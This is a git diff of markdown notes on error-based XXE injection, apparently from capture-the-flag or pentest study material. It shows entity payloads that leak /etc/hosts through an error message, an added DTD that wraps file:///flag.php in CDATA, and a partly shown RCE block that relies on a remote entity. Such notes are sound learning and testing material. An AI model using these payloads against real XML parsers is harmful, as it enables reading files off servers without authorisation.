@@ -71,12 +71,13 @@ Payload
 ## Error Based XXE
 <img width="1531" height="451" alt="image" src="https://github.com/user-attachments/assets/e4859438-5010-4ca5-8576-084519400caa" />
 
-- Example
 LFI
 ``` bash
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>"> 
 ```
+- Example
+
 RCE
 ``` bash
 <!DOCTYPE email [ 
@@ -84,5 +85,11 @@ RCE
   %remote;
   %error;
 ]>
+
+# dtd
+<!ENTITY % begin "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///flag.php">
+<!ENTITY % end "]]>">
+<!ENTITY joined "%begin;%file;%end;">
 
 ```
